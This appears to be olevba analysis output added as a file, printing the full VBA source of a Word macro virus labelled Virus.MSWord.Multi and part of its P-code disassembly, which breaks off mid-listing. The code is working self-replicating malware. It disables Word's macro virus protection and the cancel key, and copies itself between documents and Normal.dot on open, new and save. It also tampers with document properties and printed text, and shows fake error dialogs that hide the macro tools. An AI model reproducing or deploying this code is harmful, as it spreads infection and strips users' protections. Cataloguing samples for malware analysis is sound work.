@@ -1,0 +1,3144 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Multi
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Multi - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO MultiVirus.bas 
+in file: ./Virus.MSWord.Multi - OLE stream: 'Macros/VBA/MultiVirus'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoExec()
+Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
+Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoExec"
+' WM.Clock
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo errorAE
+Dim MyDate, MyTime, PauseTime, Start, Finish, TotalTime
+MyDate = Date
+D$ = Mid(MyDate, 1, 2)
+MyTime = Time
+If D$ = "25" Then
+    MsgBox "Il est " & MyTime, Title:="Clock"
+Clock:
+    PauseTime = 120
+    Start = Timer
+    Do While Timer < Start + PauseTime
+        DoEvents
+    Loop
+    Finish = Timer
+    TotalTime = Finish - Start
+    MsgBox "Il est " & MyTime, Title:="Clock"
+GoTo Clock
+Else
+    End
+End If
+errorAE:
+End Sub
+Sub AutoNew()
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorAN
+Dim MyDate
+MyDate = Date
+D1$ = Mid(MyDate, 1, 2)
+If (D1$ = "2") Or (D1$ = "7") Or (D1$ = "11") Or (D1$ = "12") Then
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
+    With Dialogs(wdDialogFileSummaryInfo)
+        .Subject = "You Have been infected by the Alliance 98"
+        .Execute
+    End With
+End If
+ErrorAN:
+End Sub
+Sub AutoOpen()
+Attribute AutoOpen.VB_Description = "Macro créée ZeMacroKiller98"
+Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.AutoOpen"
+'
+' AutoOpen Macro
+'
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorAO
+Dim MyDate, MyTime, MyWeek, NbreCarac, NomFichier
+MyDate = Date
+D$ = Mid(MyDate, 1, 5)
+D1$ = Mid(MyDate, 1, 2)
+MyWeek = WeekDay(MyDate, vbMonday)
+NomFichier = ActiveDocument.Name
+NbreCarac = Len(NomFichier)
+iMacroCount = WordBasic.CountMacros(0, 0)
+For i = 1 To iMacroCount
+    If WordBasic.[MacroName$](i, 0) = "MultiVirus" Then
+        bInstalled = -1
+    End If
+Next i
+' WM.Concept
+If Not bInstalled Then
+    MsgBox "1"
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
+Else
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
+    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
+End If
+' WM.Alien
+If D$ = "01/08" Then
+    MsgBox "Hides the program manager", vbCritical, "Another Year of Survival..."
+End If
+If MyWeek = "7" Then
+    MsgBox "Closes current file", vbCritical, "It's Sunday & I intend to relax!"
+End If
+If NomFichier < 9 Then
+    MsgBox "", Title:="Longer File Names Should Be Used"
+End If
+'WM.Alliance
+If (D1$ = "2") Or (D1$ = "7") Or (D1$ = "11") Or (D1$ = "12") Then
+    With Dialogs(wdDialogFileSummaryInfo)
+        .Subject = "You Have been infected by the Alliance 98"
+        .Execute
+    End With
+End If
+'WM.Npad.A
+WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Compteur", "Winword8.ini")
+Sales = WordBasic.Val(WOpen$) + 1
+WordBasic.SetPrivateProfileString "Microsoft Word", "Compteur", Str(Sales), "Winword8.ini"
+WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "Compteur", "Winword8.ini")
+If WOpen$ = 23 Then
+    StatusBar = "                                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                   DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                       DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                           DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+    StatusBar = "                                                                                                                                               DOEUNPAD98, V3.0,(c) Maret 1998"
+    For i = 1 To 400000
+    Next i
+WordBasic.SetPrivateProfileString "Microsoft Word", "Compteur", "1", "Winword8.ini"
+End If
+ErrorAO:
+End Sub
+Sub FileSaveAs()
+Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
+Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileSaveAs"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFSA
+    Dialogs(wdDialogFileSaveAs).Show
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
+ActiveDocument.Save
+ErrorFSA:
+If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
+    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
+End If
+End Sub
+Sub FilePrint()
+Attribute FilePrint.VB_Description = "Macro crée par ZeMacroKiller98"
+Attribute FilePrint.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrint"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFP
+InsertPayload
+    Dialogs(wdDialogFilePrint).Show
+ErrorFP:
+End Sub
+Sub FilePrintDefault()
+Attribute FilePrintDefault.VB_Description = "Macro créee par ZeMacroKiller98"
+Attribute FilePrintDefault.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FilePrintDefault"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFPD
+InsertPayload
+    ActiveDocument.PrintOut
+ErrorFPD:
+End Sub
+Sub FileTemplates()
+Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
+Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.FileTemplates"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorFT
+    UserForm900.Show
+ErrorFT:
+End Sub
+Sub InsertPayload()
+Attribute InsertPayload.VB_Description = "Macro créee par ZeMacroKiller98"
+Attribute InsertPayload.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.InsertPayload"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorIP
+Dim WPrint$, Adding
+WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
+Adding = WordBasic.Val(WPrint$) + 1
+WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", Str(Adding), "Nuclear98.ini"
+WPrint$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NbrePrint", "Nuclear98.ini")
+If WPrint$ = 12 Then
+    Selection.EndKey Unit:=wdLine
+    Selection.TypeParagraph
+    Selection.TypeText Text:="And finally i would like to say"
+    Selection.TypeParagraph
+    Selection.TypeParagraph
+    Selection.TypeText Text:="STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC!"
+    Selection.HomeKey Unit:=wdLine
+    Selection.EndKey Unit:=wdLine, Extend:=wdExtend
+    Selection.Font.Bold = wdToggle
+    WordBasic.SetPrivateProfileString "Microsoft Word", "NbrePrint", "1", "Nuclear98.ini"
+End If
+ErrorIP:
+End Sub
+Sub ToolsMacro()
+Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
+Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ToolsMacro"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorTM
+    UserForm999.Show
+ErrorTM:
+End Sub
+Sub ViewVBCode()
+Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
+Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.MultiVirus.ViewVBCode"
+Application.EnableCancelKey = wdCancelDisabled
+WordBasic.DisableAutoMacros 0
+Options.VirusProtection = False
+On Error GoTo ErrorVVBC
+    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+ErrorVVBC:
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO UserForm900.frm 
+in file: ./Virus.MSWord.Multi - OLE stream: 'Macros/VBA/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+
+
+Private Sub CommandButton1_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton2_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton3_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton4_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton5_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, Title:="Microsoft Word"
+Unload UserForm900
+End Sub
+
+Private Sub CommandButton6_Click()
+Unload UserForm900
+End Sub
+
+Private Sub UserForm_Initialize()
+    TextBox1.Text = NormalTemplate.Name
+    CommandButton2.Enabled = False
+    CommandButton3.Enabled = False
+    CommandButton4.Enabled = False
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO UserForm999.frm 
+in file: ./Virus.MSWord.Multi - OLE stream: 'Macros/VBA/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+
+
+
+
+
+
+Private Sub ListBox1_Click()
+    If ListBox1.Selected(0) = True Then
+        CommandButton1.Enabled = True
+        CommandButton3.Enabled = True
+        CommandButton4.Enabled = True
+        CommandButton6.Enabled = True
+    ElseIf ListBox1.Selected(1) = True Then
+        CommandButton1.Enabled = True
+        CommandButton3.Enabled = True
+        CommandButton4.Enabled = True
+        CommandButton6.Enabled = True
+    Else
+        CommandButton1.Enabled = False
+        CommandButton3.Enabled = False
+        CommandButton4.Enabled = False
+        CommandButton6.Enabled = False
+    End If
+End Sub
+
+Private Sub UserForm_Initialize()
+    ComboBox1.AddItem "Commande Word"
+    ComboBox1.AddItem "Tous les modèles actifs"
+    ComboBox1.AddItem "Normal.dot (modèle global)"
+    ComboBox1.AddItem WordBasic.WindowName$()
+    CommandButton1.Enabled = False
+    CommandButton3.Enabled = False
+    TextBox2.Text = "Macro créée le " & Date & " par " & Application.UserName
+End Sub
+
+Private Sub CommandButton1_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+Private Sub CommandButton2_Click()
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton3_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton4_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton5_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton6_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+Private Sub CommandButton7_Click()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+Private Sub ScrollBar1_Change()
+MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
+Unload UserForm999
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Multi
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 965 bytes
+' Macros/VBA/MultiVirus - 28619 bytes
+' Line #0:
+' 	FuncDefn (Sub AuToExEc())
+' Line #1:
+' 	QuoteRem 0x0000 0x0009 " WM.Clock"
+' Line #2:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #3:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #4:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #5:
+' 	OnError errorAE 
+' Line #6:
+' 	Dim 
+' 	VarDefn MyDate
+' 	VarDefn MyTime
+' 	VarDefn PauseTime
+' 	VarDefn Start
+' 	VarDefn Finish
+' 	VarDefn TotalTime
+' Line #7:
+' 	Ld Date 
+' 	St MyDate 
+' Line #8:
+' 	Ld MyDate 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0002 
+' 	ArgsLd Mid$ 0x0003 
+' 	St D$ 
+' Line #9:
+' 	Ld Time 
+' 	St MyTime 
+' Line #10:
+' 	Ld D$ 
+' 	LitStr 0x0002 "25"
+' 	Eq 
+' 	IfBlock 
+' Line #11:
+' 	LitStr 0x0007 "Il est "
+' 	Ld MyTime 
+' 	Concat 
+' 	LitStr 0x0005 "Clock"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0002 
+' Line #12:
+' 	Label Clock 
+' Line #13:
+' 	LitDI2 0x0078 
+' 	St PauseTime 
+' Line #14:
+' 	Ld Timer 
+' 	St Start 
+' Line #15:
+' 	Ld Timer 
+' 	Ld Start 
+' 	Ld PauseTime 
+' 	Add 
+' 	Lt 
+' 	DoWhile 
+' Line #16:
+' 	ArgsCall DoEvents 0x0000 
+' Line #17:
+' 	Loop 
+' Line #18:
+' 	Ld Timer 
+' 	St Finish 
+' Line #19:
+' 	Ld Finish 
+' 	Ld Start 
+' 	Sub 
+' 	St TotalTime 
+' Line #20:
+' 	LitStr 0x0007 "Il est "
+' 	Ld MyTime 
+' 	Concat 
+' 	LitStr 0x0005 "Clock"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0002 
+' Line #21:
+' 	GoTo Clock 
+' Line #22:
+' 	ElseBlock 
+' Line #23:
+' 	End 
+' Line #24:
+' 	EndIfBlock 
+' Line #25:
+' 	Label errorAE 
+' Line #26:
+' 	EndSub 
+' Line #27:
+' 	FuncDefn (Sub AutoNew())
+' Line #28:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #29:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #30:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #31:
+' 	OnError ErrorAN 
+' Line #32:
+' 	Dim 
+' 	VarDefn MyDate
+' Line #33:
+' 	Ld Date 
+' 	St MyDate 
+' Line #34:
+' 	Ld MyDate 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0002 
+' 	ArgsLd Mid$ 0x0003 
+' 	St D1$ 
+' Line #35:
+' 	Ld D1$ 
+' 	LitStr 0x0001 "2"
+' 	Eq 
+' 	Paren 
+' 	Ld D1$ 
+' 	LitStr 0x0001 "7"
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld D1$ 
+' 	LitStr 0x0002 "11"
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld D1$ 
+' 	LitStr 0x0002 "12"
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #36:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000A "MultiVirus"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #37:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm900"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #38:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x000B "UserForm999"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #39:
+' 	StartWithExpr 
+' 	Ld wdDialogFileSummaryInfo 
+' 	ArgsLd Dialogs 0x0001 
+' 	With 
+' Line #40:
+' 	LitStr 0x0029 "You Have been infected by the Alliance 98"
+' 	MemStWith Subject 
+' Line #41:
+' 	ArgsMemCallWith Execute 0x0000 
+' Line #42:
+' 	EndWith 
+' Line #43:
+' 	EndIfBlock 
+' Line #44:
+' 	Label ErrorAN 
+' Line #45:
+' 	EndSub 
+' Line #46:
+' 	FuncDefn (Sub AuToOpEn())
+' Line #47:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #48:
+' 	QuoteRem 0x0000 0x000F " AuToOpEn Macro"
+' Line #49:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #50:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #51:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #52:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #53:
+' 	OnError ErrorAO 
+' Line #54:
+' 	Dim 
+' 	VarDefn MyDate
+' 	VarDefn MyTime
+' 	VarDefn MyWeek
+' 	VarDefn NbreCarac
+' 	VarDefn NomFichier
+' Line #55:
+' 	Ld Date 
+' 	St MyDate 
+' Line #56:
+' 	Ld MyDate 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0005 
+' 	ArgsLd Mid$ 0x0003 
+' 	St D$ 
+' Line #57:
+' 	Ld MyDate 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0002 
+' 	ArgsLd Mid$ 0x0003 
+' 	St D1$ 
+' Line #58:
+' 	Ld MyDate 
+' 	Ld vbMonday 
+' 	ArgsLd WeekDay 0x0002 
+' 	St MyWeek 
+' Line #59:
+' 	Ld ActiveDocument 
+' 	MemLd New 
+' 	St NomFichier 
+' Line #60:
+' 	Ld NomFichier 
+' 	FnLen 
+' 	St NbreCarac 
+' Line #61:
+' 	LitDI2 0x0000 
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemLd CountMacros 0x0002 
+' 	St iMacroCount 
+' Line #62:
+' 	StartForVariable 
+' 	Ld i 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld iMacroCount 
+' 	For 
+' Line #63:
+' 	Ld i 
